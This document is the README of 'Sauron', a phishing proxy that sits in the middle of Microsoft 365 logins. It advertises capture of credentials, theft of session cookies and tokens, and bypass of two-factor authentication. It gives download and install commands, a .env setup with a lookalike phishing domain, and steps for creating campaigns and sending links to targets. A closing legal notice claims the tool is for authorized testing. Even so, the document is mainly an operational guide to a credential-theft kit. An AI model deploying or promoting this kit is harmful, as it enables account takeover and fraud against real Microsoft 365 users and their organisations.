
# Sauron - Microsoft 365 MITM Proxy

Microsoft 365 login flow interception for credential capture and session harvesting.

## 🎯 What It Does

- **Captures Credentials**: Real-time username/password capture
- **Steals Sessions**: Microsoft authentication cookies and tokens
- **2FA Bypass**: Multi-factor authentication token harvesting
- **Live Monitoring**: WebSocket dashboard for real-time operations
- **SSL Automation**: Automatic HTTPS certificates

## 🚀 Installation

### Requirements

- Ubuntu 20.04+ VPS with root access
- Domain name pointed to your server
- Cloudflare account (free tier works)

### Production Release (Linux VPS)

```bash
# 1. Download the latest Linux release
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz

# 2. Extract and install
tar -xzf sauron-linux-amd64.tar.gz
cd sauron

# 3. One-command setup (handles everything automatically)
sudo ./install-production.sh
```

**That's it!** The installer will:
- Install Docker and system dependencies automatically
- Walk you through Cloudflare setup step-by-step
- Configure SSL certificates with Let's Encrypt
- Start Sauron service automatically

### Development Build (Source Access)

```bash
# Only if you have source code access
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro
sudo ./install/setup.sh
```

### Configuration

Edit `.env` file with your settings:

```bash
# Your phishing domain
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token (for SSL automation)
CLOUDFLARE_API_TOKEN=your_token_here

# Turnstile secret (optional bot protection)
TURNSTILE_SECRET=your_secret_here
```

## 📱 Usage

### Access Points

- **Admin Panel**: `https://yourdomain.com/admin`
- **Statistics**: `https://yourdomain.com/stats`
- **WebSocket**: `wss://yourdomain.com/ws`

### Creating Operations

1. Open admin panel: `https://yourdomain.com/admin`
2. Create a new slug (operation identifier)
3. Send targets to: `https://login.yourdomain.com/your-slug`

### Management Commands

```bash
# Check status
sudo systemctl status sauron

# View logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron
```

## 🛠️ Development

### Building Releases

```bash
# Build binary release package
./scripts/build-release.sh v2.0.1

# Build Docker release package
./scripts/build-docker-release.sh v2.0.1

# Deploy to production server
./scripts/deploy-production.sh
```

### Project Structure

- `main.go` - Main application entry point
- `capture/` - Credential and session capture logic
- `inject/` - JavaScript injection and obfuscation
- `proxy/` - MITM proxy and TLS interception
- `ws/` - WebSocket management interface
- `install/` - Installation and setup scripts

## 📚 Documentation

**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**

Includes:
- Advanced configuration options
- API endpoint documentation
- Troubleshooting guides
- Security best practices

## ⚠️ Legal Notice

This tool is for authorized security testing and educational purposes only. Users are responsible for compliance with applicable laws and regulations.

---

**For questions or issues, check the documentation or open a GitHub issue.**
